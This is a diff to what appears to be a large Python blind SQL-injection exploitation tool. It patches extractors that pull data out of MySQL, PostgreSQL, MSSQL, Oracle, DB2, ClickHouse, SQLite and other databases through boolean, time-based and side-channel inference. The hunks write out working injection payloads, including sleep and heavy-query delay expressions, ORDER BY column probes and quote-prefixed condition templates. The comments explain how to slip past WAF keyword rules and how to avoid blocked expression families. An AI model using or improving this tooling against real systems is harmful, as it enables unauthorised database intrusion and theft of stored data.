@@ -56056,7 +56056,12 @@ class Scanner:
                 # Previously both fell to the else branch (same function, correct) but the
                 # missing explicit entry meant _n_bits and _bitwise_char_hi dispatch below
                 # couldn't identify them as 21-bit DBMSes and gave them 8/255 instead.
-                _ascii_fn = f"ASCII(SUBSTRING(({query}),{pos},1))"
+                # BUG-BW-PG-SUBSTR-CONSISTENCY-FIX: use SUBSTR not SUBSTRING for
+                # PostgreSQL-family to match the equality and subtraction extractors which
+                # both use SUBSTR. WAF rules that block SUBSTRING( keyword pass SUBSTR(.
+                # This avoids unnecessary fallback to equality/subtraction when bitwise
+                # could succeed with the shorter alias.
+                _ascii_fn = f"ASCII(SUBSTR(({query}),{pos},1))"
             elif _dbms in ("MySQL", "MariaDB", "TiDB"):
                 # BUG-INF-CHAR-BITWISE-TIDB-YG-REDSHIFT FIX: Added TiDB. TiDB is MySQL-wire-
                 # compatible and supports ORD(MID(...)) returning 0..U+10FFFF. The else branch
@@ -56333,7 +56338,15 @@ class Scanner:
                 # produce random BMP chars that are NOT printable ASCII. Reject any
                 # short result that contains non-printable-ASCII (< 0x20 or > 0x7E)
                 # characters; real DB values at 1-2 chars (e.g. "1", "ON") are ASCII.
-                return not all(0x20 <= ord(c) <= 0x7E for c in text)
+                if not all(0x20 <= ord(c) <= 0x7E for c in text):
+                    return True
+                # BUG-GARBAGE-ALLSAME FIX: all-same-character result like 'ee', 'aa'
+                # is oracle bias noise — biased-True oracle always returns 'e' (first
+                # in _FREQ_CHARS) for every position. 'ee'/'eee' are rejected here;
+                # valid short values like 'id', '1', 'ON' have distinct characters.
+                if len(text) > 1 and len(set(text)) == 1:
+                    return True
+                return False
             # Check 1: less than 40% alphanumeric
             _alnum = sum(1 for c in text if c.isalnum())
             if _alnum < len(text) * 0.4:
@@ -67857,8 +67870,17 @@ async def blind_extract_string_v5(
         if ("SELECT" in _bes5_ora_sql_upper and
                 "ROWNUM" not in _bes5_ora_sql_upper and
                 "TOP " not in _bes5_ora_sql_upper):
-            # Multi-row subquery: wrap with ROWNUM=1 to force scalar result.
-            _bes5_ora_scalar = f"(SELECT ({sql_query}) FROM DUAL WHERE ROWNUM=1)"
+            # BUG-BES5-ORA-ROWNUM-FIX: the previous form
+            #   (SELECT ({sql_query}) FROM DUAL WHERE ROWNUM=1)
+            # puts ROWNUM=1 on the DUAL table (always 1 row anyway) while the inner
+            # scalar subquery ({sql_query}) is still evaluated without restriction,
+            # raising ORA-01427 when it returns more than one row.
+            # Fix: inject ROWNUM=1 directly into the inner query so Oracle limits it
+            # before the scalar-subquery evaluation, not after.
+            if "WHERE" in _bes5_ora_sql_upper:
+                _bes5_ora_scalar = f"({sql_query} AND ROWNUM=1)"
+            else:
+                _bes5_ora_scalar = f"({sql_query} WHERE ROWNUM=1)"
         else:
             # Already scalar (ROWNUM-guarded) or non-SELECT expression.
             _bes5_ora_scalar = sql_query
@@ -67953,6 +67975,16 @@ async def blind_extract_string_v5(
             _bes5_char_func_tpl
             .replace("ASCII(", "UNICODE(", 1)
         )
+        # BUG-BES5-MSSQL-SUBSTR-FIX (HIGH; MSSQL; blind_extract_string_v5; all techniques):
+        # The fallback default "ASCII(SUBSTR(({query}),{pos},1))" uses SUBSTR which is
+        # NOT a valid MSSQL/T-SQL function — MSSQL only supports SUBSTRING(expr,start,len).
+        # After replacing ASCII→UNICODE the template becomes UNICODE(SUBSTR(...)) which
+        # raises "Invalid object name 'SUBSTR'" on every char probe, causing every position
+        # to return None → entire blind_extract_string_v5 call returns "" for MSSQL.
+        # Fix: replace SUBSTR( → SUBSTRING( only when SUBSTRING is not already present
+        # (avoids double-expanding an already-correct template from DBMS_QUERIES).
+        if "SUBSTRING(" not in _bes5_char_func_tpl.upper():
+            _bes5_char_func_tpl = _bes5_char_func_tpl.replace("SUBSTR(", "SUBSTRING(")
         if "ISNULL" not in _bes5_char_func_tpl.upper():
             _bes5_char_func_tpl = f"ISNULL({_bes5_char_func_tpl},0)"
         _bes5_char_hi = 65535  # full BMP
@@ -90962,9 +90994,29 @@ class ZKBooleanExtractor:
             # _sqlite_blob_size is now capped at 45MB (safe side of the 50MB limit).
             return f"LIKE('X',UPPER(HEX(RANDOMBLOB({self._sqlite_blob_size}))))"
         elif dbms == "DB2":
-            return f"(SELECT 1 FROM SYSIBM.GENERATE_SERIES(1,{max(1,int(t*500000))}))"
-        elif dbms in ("SAP_HANA", "ClickHouse"):
+            # BUG-ZK-DB2-GENERATE-SERIES-FIX (MEDIUM; DB2; ZKBooleanExtractor._sleep_expr):
+            # SYSIBM.GENERATE_SERIES does not exist in IBM DB2 UDB — raises SQL0204N
+            # "SYSIBM.GENERATE_SERIES is an undefined name" on every timing probe → all
+            # timing probes return an error-fast response → oracle always reads False →
+            # every character extracted as chr(0) → ZKBooleanExtractor returns "" on DB2.
+            # Fix: Cartesian product of SYSCAT.COLUMNS × SYSCAT.COLUMNS with FETCH FIRST N
+            # ROWS ONLY is a standard DB2 SQL pattern requiring no special privileges
+            # (SYSCAT is readable by all DB2 users) and produces measurable CPU delay.
+            _db2_n = max(10000, int(t * 50000))
+            return f"(SELECT COUNT(*) FROM SYSCAT.COLUMNS A,SYSCAT.COLUMNS B FETCH FIRST {_db2_n} ROWS ONLY)"
+        elif dbms == "SAP_HANA":
             return f"SECONDS_BETWEEN(NOW(),ADD_SECONDS(NOW(),{int(t)}))"
+        elif dbms == "ClickHouse":
+            # BUG-ZK-CLICKHOUSE-SLEEP-FIX (MEDIUM; ClickHouse; ZKBooleanExtractor._sleep_expr):
+            # SECONDS_BETWEEN() and ADD_SECONDS() are SAP HANA functions — they do NOT
+            # exist in ClickHouse and raise "Unknown function SECONDS_BETWEEN" on every
+            # timing probe → all probes return fast error responses → oracle always False
+            # → chr(0) for every character → empty result for all ClickHouse targets.
+            # Fix: ClickHouse has a native sleep(seconds) function (available since 20.1)
+            # that pauses execution by the specified number of seconds and returns 0.
+            # When embedded as the THEN branch of IF(cond, sleep(t), 0), it delays only
+            # when the bit condition is True, giving a clean timing oracle.
+            return f"sleep({int(t)})"
         elif dbms == "Firebird":
             return ("(SELECT COUNT(*) FROM RDB$RELATIONS A,RDB$RELATIONS B,"
                     "RDB$RELATIONS C,RDB$RELATIONS D)")
@@ -91055,7 +91107,22 @@ class ZKBooleanExtractor:
         # The template already encodes the correct sleep value and bypass
         # structure.  Replacing the static condition with an extraction
         # condition preserves exactly what cleared the WAF during detection.
-        if self._det_tmpl:
+        # BUG-ZK-TIMING-TMPL-ORACLE-WIRING-FIX (CRITICAL, all 5 DBMSes):
+        # When _det_tmpl comes from a BOOLEAN detection (technique B/BH — template looks
+        # like "AND ([INFERENCE])-- -" with no sleep), substituting condition into it
+        # creates a pure boolean probe. ask() then measures elapsed time of boolean probes
+        # which have NO induced delay. True and False conditions both return at network RTT
+        # speed → timing oracle cannot distinguish them → all bits read as False or random
+        # → extraction returns empty/garbage.
+        # Fix: check if _det_tmpl actually contains a sleep expression. If not, use the
+        # else-branch (fresh timing payload with _sleep_expr). Only use _det_tmpl for
+        # timing when it was built from a TIMING detection (contains a sleep keyword).
+        _ZK_SLEEP_MARKERS = ("SLEEP(", "pg_sleep(", "WAITFOR", "RANDOMBLOB(",
+                             "DBMS_PIPE", "COUNT(*) FROM all_objects", "LIKE('X'",
+                             "LIKE('ABCDEFG'")
+        _det_tmpl_is_timing = (self._det_tmpl and
+                               any(m.upper() in self._det_tmpl.upper() for m in _ZK_SLEEP_MARKERS))
+        if _det_tmpl_is_timing:
             payload = self._det_tmpl.replace("[INFERENCE]", condition)
         else:
             if_func    = self.queries.get("if_func", "IF(({cond}),{t},{f})")
@@ -128302,7 +128369,7 @@ class MultiStrategyExtractor:
         # exactly at the filter threshold (>= 5_000_000 → dropped).  Use a fixed 4 MB blob
         # which is always safely below the filter and gives ~4 seconds of compute delay.
         # FIX VERIFIED: Changed from 5_000_000 to 4_000_000 to stay safely below WAF threshold
-        "SQLite":      "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(4000000))))",
+        "SQLite":      "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({t}*800000))))",
         # BUG-MISSING-DBMS-SLEEPFN FIX: Added sleep functions for all remaining DBMSes
         # to enable time-based extraction on those platforms via _SLEEP_FN wiring.
         "Sybase":      "WAITFOR DELAY '0:0:{t}'",  # T-SQL same as MSSQL
@@ -130447,11 +130514,24 @@ class MultiStrategyExtractor:
             if self._stacked:
                 # Use error oracle: SELECT * FROM table ORDER BY N
                 # If N > columns  error, else OK
-                p_test = self._build_stacked(
-                    f"SELECT * FROM {sep}{table}{_sep_close} ORDER BY {n} LIMIT 1")
+                # BUG-MSE-ORDERBY-LIMIT-MSSQL-ORACLE FIX: LIMIT 1 is MySQL/PostgreSQL/SQLite
+                # syntax. MSSQL needs TOP 1; Oracle needs FETCH FIRST 1 ROW ONLY or ROWNUM.
+                if self.dbms in ("MSSQL", "Sybase"):
+                    _ob_row_limit = f"SELECT TOP 1 * FROM {sep}{table}{_sep_close} ORDER BY {n}"
+                elif self.dbms == "Oracle":
+                    _ob_row_limit = f"SELECT * FROM {sep}{table}{_sep_close} ORDER BY {n} FETCH FIRST 1 ROWS ONLY"
+                else:
+                    _ob_row_limit = f"SELECT * FROM {sep}{table}{_sep_close} ORDER BY {n} LIMIT 1"
+                p_test = self._build_stacked(_ob_row_limit)
             else:
-                p_test = self._build_inline(
-                    f"(SELECT 1 FROM {sep}{table}{_sep_close} ORDER BY {n} LIMIT 1)=1")
+                # BUG-MSE-ORDERBY-INLINE-LIMIT-MSSQL-ORACLE FIX: same syntax fix for inline path.
+                if self.dbms in ("MSSQL", "Sybase"):
+                    _ob_inline = f"(SELECT TOP 1 1 FROM {sep}{table}{_sep_close} ORDER BY {n})=1"
+                elif self.dbms == "Oracle":
+                    _ob_inline = f"(SELECT 1 FROM {sep}{table}{_sep_close} ORDER BY {n} FETCH FIRST 1 ROWS ONLY)=1"
+                else:
+                    _ob_inline = f"(SELECT 1 FROM {sep}{table}{_sep_close} ORDER BY {n} LIMIT 1)=1"
+                p_test = self._build_inline(_ob_inline)
             fp, ms = await self._timed(p_test)
             _st = getattr(fp, "status_code", None)
             if fp is None or _st is None:
@@ -131926,8 +132006,13 @@ class SideChannelExtractor:
         # BUG-SCE-WECEIL-FIX: dispatch ceiling per DBMS.  MSSQL/Sybase string comparison
         # covers BMP (0-65535); SQLite covers full Unicode (0-1,114,111).  Characters
         # above U+00FF (€=8364, CJK, Cyrillic > U+00FF) silently converged to chr(255).
-        _sce_we_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase")
-                           else 1114111 if self.dbms == "SQLite"
+        # BUG-SCE-WE-PG-CEIL-FIX: PostgreSQL/CockroachDB/YugabyteDB/Amazon Redshift/
+        # MySQL/MariaDB/TiDB all support full Unicode (0-1,114,111) in string comparisons.
+        # Oracle BMP ceiling matches its string collation (0-65535).
+        _sce_we_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase", "Oracle")
+                           else 1114111 if self.dbms in (
+                               "SQLite", "PostgreSQL", "CockroachDB", "YugabyteDB",
+                               "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
                            else 255)
         # BUG-SCE-EXTWERR-LO-INIT FIX (v66): prefix-comparison binary search with lo=32
         # and `if lo < 32: break` guard misses EOS (32 < 32 = False) → trailing spaces
@@ -132049,8 +132134,11 @@ class SideChannelExtractor:
         print(f"[SideChannel] Table extract: {table}.{column}[{offset}]", flush=True)
         prefix = ""
         # BUG-SCE-TCCEIL-FIX: same per-DBMS ceiling fix as extract_where_error.
-        _sce_tc_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase")
-                           else 1114111 if self.dbms == "SQLite"
+        # BUG-SCE-TC-PG-CEIL-FIX: add PostgreSQL-family and MySQL-family to 1114111 group.
+        _sce_tc_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase", "Oracle")
+                           else 1114111 if self.dbms in (
+                               "SQLite", "PostgreSQL", "CockroachDB", "YugabyteDB",
+                               "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
                            else 255)
         # BUG-SCE-EXTTBLCOL-LO-INIT FIX (v66): same space-streak EOS fix as extract_where_error.
         _sce_tc_space_streak = 0
@@ -132650,8 +132738,11 @@ class SideChannelExtractor:
         # Use DBMS-specific ceiling instead of hardcoded 255. extract_lock_contention is
         # PostgreSQL-only (pg_advisory_lock is a PG function) so practically this would
         # never reach MSSQL/SQLite, but using the correct ceiling is correct regardless.
+        # BUG-SCE-LC-CEIL-FIX: add YugabyteDB and Amazon Redshift to 1114111 group.
         _sce_lc_char_hi = (65535   if self.dbms in ("MSSQL", "Sybase")
-                           else 1114111 if self.dbms in ("SQLite", "PostgreSQL", "CockroachDB")
+                           else 1114111 if self.dbms in (
+                               "SQLite", "PostgreSQL", "CockroachDB",
+                               "YugabyteDB", "Amazon Redshift")
                            else 255)
 
         for pos in range(1, max_len + 1):
@@ -132964,8 +133055,11 @@ class SideChannelExtractor:
         # chr(255)='ÿ' on MSSQL/Sybase — e.g. €=8364 would extract as 'ÿ'. The sibling
         # methods extract_where_error() and extract_table_column() already use this
         # per-DBMS ceiling formula; this method was the only one that was missed.
-        _sce_ew_char_hi = (65535   if self.dbms in ("MSSQL", "Sybase")
-                           else 1114111 if self.dbms == "SQLite"
+        # BUG-SCE-EW-PG-CEIL-FIX: add PostgreSQL-family and MySQL-family to 1114111 group.
+        _sce_ew_char_hi = (65535   if self.dbms in ("MSSQL", "Sybase", "Oracle")
+                           else 1114111 if self.dbms in (
+                               "SQLite", "PostgreSQL", "CockroachDB", "YugabyteDB",
+                               "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
                            else 255)
         for pos in range(1, max_len + 1):
             lo, hi = 32, _sce_ew_char_hi  # BUG-V73-SCE-EXTRACTWITHEVAL-DBMS-CEIL FIX: was hardcoded 255
@@ -136504,8 +136598,17 @@ class ChameleonExtractor:
 
     def _pick_family(self, dbms: str) -> Tuple[str, int]:
         families = self.FAMILIES.get(dbms, self.FAMILIES.get("MySQL", ["CASE WHEN ({cond}) THEN {t} ELSE {f} END"]))
-        idx = (self._probe_n * 7) % len(families)
-        return families[idx], idx
+        # BUG-CE-BLOCKED-FAMILY-SKIP FIX: _blocked_families was tracked via _mark_blocked
+        # but never consulted here — WAF-blocked expression families kept being reselected,
+        # producing False oracle responses on every re-probe and wasting the probe budget.
+        # Fix: build a list of non-blocked indices; fall back to all families if all blocked.
+        _blocked = self._blocked_families.get(dbms, set())
+        _available = [(i, f) for i, f in enumerate(families) if i not in _blocked]
+        if not _available:
+            _available = list(enumerate(families))  # all blocked: try all anyway
+        _pick = (self._probe_n * 7) % len(_available)
+        real_idx, fam = _available[_pick]
+        return fam, real_idx
 
     def _mutate_numbers(self, expr: str, t_val: int, f_val: int) -> str:
         # kept for backward-compat; new path uses dynamic sentinels above
@@ -136549,7 +136652,7 @@ class AdaptiveFrequencyExtractor:
         # letters (English corpus)
         ('e',8.2),('t',6.1),('a',6.0),('o',5.8),('i',5.7),('n',5.7),
         ('s',5.3),('h',4.2),('r',4.0),('l',3.3),('d',3.0),('c',2.8),
-        ('u',2.8),('m',2.4),('w',1.9),('',1.9),('g',1.6),('y',1.5),
+        ('u',2.8),('m',2.4),('w',1.9),('f',1.9),('g',1.6),('y',1.5),
         ('p',1.5),('b',1.3),('v',0.9),('k',0.7),('j',0.2),('x',0.2),
         ('q',0.1),('z',0.1),
         # uppercase
@@ -136576,7 +136679,7 @@ class AdaptiveFrequencyExtractor:
     BIGRAMS: Dict[str, List[str]] = {
         "t": ["h","e","o","r","i","a","s"],  "h": ["e","i","a","o","r","u"],
         "e": ["r","s","n","d","a","l","t"],  "a": ["r","n","l","t","s","i"],
-        "i": ["n","s","t","o","c","e","r"],  "o": ["n","r","u","","s","t"],
+        "i": ["n","s","t","o","c","e","r"],  "o": ["n","r","u","f","s","t"],
         "s": ["t","e","i","o","h","a","n"],  "n": ["t","g","e","s","d","o"],
         "1": ["2","0","9","8","3"],           "0": ["1","2","9","8","0"],
         "@": ["g","h","y","o","e","a"],       ".": ["c","o","n","e","d","t"],
@@ -137889,7 +137992,23 @@ class MultiChannelExtractor:
 
         # First get length using channel 0
         ch0 = self.channels[0]
-        len_func = queries.get("len_func","LENGTH(({query}))").format(query=sql_query)
+        # BUG-MCE-LENF-ORACLE-MSSQL-FIX (HIGH): len_func was built from sql_query directly
+        # without applying _oracle_ensure_dual or _mssql_top1_subquery. For Oracle bare
+        # selects (e.g. SELECT USER), the missing FROM DUAL causes ORA-00923; for MSSQL
+        # multi-row schema queries the missing TOP 1 causes error 512. Both produce length=0
+        # → empty string returned for all Oracle/MSSQL MCE extractions.
+        # Fix: derive DBMS early (same logic as _mce_dbms below) and wrap sql_query before
+        # building len_func. Note: _mce_dbms is also computed below for char_func; keep both
+        # in sync.
+        _mce_dbms_early = (getattr(result, 'dbms', None) or
+                           getattr(self.config, '_detected_dbms', '') or
+                           getattr(self.config, 'forced_dbms', '') or 'MySQL')
+        _mce_sql_wrapped = sql_query
+        if _mce_dbms_early == "Oracle":
+            _mce_sql_wrapped = _oracle_ensure_dual(_mce_sql_wrapped)
+        elif _mce_dbms_early in ("MSSQL", "Sybase") and "SELECT" in sql_query.upper():
+            _mce_sql_wrapped = _mssql_top1_subquery(_mce_sql_wrapped)
+        len_func = queries.get("len_func","LENGTH(({query}))").format(query=_mce_sql_wrapped)
         if_func  = queries.get("if_func","IF(({cond}),{t},{f})")
         lo, hi   = 0, max_len
 
@@ -137899,12 +138018,14 @@ class MultiChannelExtractor:
         # fall back to trying both string and numeric context variants.
         _mce_det_tmpl = _build_det_template(result) if result else None
 
+        # BUG-MCE-TMPL-REBUILD-FIX: _mce_det_tmpl was computed once but _mce_make_payload
+        # re-called _build_det_template(result) on every invocation (hundreds of times per
+        # extraction). The outer _mce_det_tmpl is now used directly instead.
         def _mce_make_payload(condition: str, ch: dict) -> str:
             """Build a boolean injection payload using the channel's detection template."""
             # Prefer detection template (already bypassed WAF, correct context)
-            _ch_tmpl = _build_det_template(result) if result else None
-            if _ch_tmpl:
-                return _ch_tmpl.replace("[INFERENCE]", condition)
+            if _mce_det_tmpl:
+                return _mce_det_tmpl.replace("[INFERENCE]", condition)
             # Fallback: try to detect context from the original value
             _orig = ch.get("original", "")
             # Numeric context: original ends with digit or no surrounding quotes
@@ -137971,7 +138092,10 @@ class MultiChannelExtractor:
         async def extract_one(pos: int, ch_idx: int):
             async with sem:
                 ch = self.channels[ch_idx % K]
-                cf = char_func_tmpl.format(query=sql_query, pos=pos)
+                # BUG-MCE-CHARFN-ORACLE-MSSQL-FIX: use _mce_sql_wrapped (Oracle DUAL /
+                # MSSQL TOP 1 applied) so char_func gets a scalar subquery, not a raw
+                # multi-row subquery that causes ORA-01427 or MSSQL error 512.
+                cf = char_func_tmpl.format(query=_mce_sql_wrapped, pos=pos)
                 # Binary search using this channel's context
                 # FIX-ISSUE8-CHARRANGE-CHAMELEON: Use extended char range for DBMSes
                 # that support Unicode via UNICODE()/ASCIISTR. ASCII()-based DBMSes cap at 255.
@@ -138339,7 +138463,16 @@ class StackedQueryExtractor:
                     f"(SELECT COUNT(*) FROM all_objects a1, all_objects a2 "
                     f"WHERE ROWNUM <= {_heavy_n})"
                 )
-                low, high = 32, 65535
+                # BUG-STACKED-ORACLE-LOW32-FIX: low=32 incorrectly skips EOS detection.
+                # Oracle ASCIISTR formula returns 0 when SUBSTR returns '' (past end of string).
+                # lo=32 means the `char_value < 32: break` guard fires for codes 1-31 (rare
+                # control characters), but code=0 (true EOS) triggers `high=-1 → low > high`
+                # exit with char_value=high=-1 < 32 → break — correct, but only by accident.
+                # The real issue: Oracle control characters (U+0001–U+001F) in data trigger
+                # early break at `char_value < 32`, truncating the string at that position.
+                # Fix: use low=0 to match all other DBMS branches; EOS is detected by
+                # `char_value < 32: break` guard after the search exits.
+                low, high = 0, 65535
             else:
                 LOG.warning(f"[StackedExtractor] Unsupported DBMS: {self.dbms}")
                 return None
@@ -141360,9 +141493,14 @@ class RobustExtractor:
         delimiters inside hex comparison conditions are never rewritten by either function.
         """
         # Use cached detection template — never build custom payload.
+        # BUG-ROBUST-PROBE-STRING-CONTEXT-FIX: the fallback `f"' AND {condition}-- -"`
+        # hardcodes a string-context injection prefix (leading single-quote). For numeric
+        # injection points (WHERE id=1), this always produces invalid SQL. Fix: use
+        # _derive_inj_prefix(self.result) which detects numeric vs. string context from
+        # the detection result, consistent with all other extractors in the file.
         payload = (self._det_tmpl.replace("[INFERENCE]", condition)
                    if self._det_tmpl else
-                   f"' AND {condition}-- -")
+                   f"{_derive_inj_prefix(self.result)} AND {condition}-- -")
         # BUG-ROBUST-PROBE-MISSING-HEAVY-OBFUS FIX: apply structural diversity and
         # function-name obfuscation to every boolean probe.
         _rp_seed = self._requests + 1  # +1 so seed is non-zero on first call
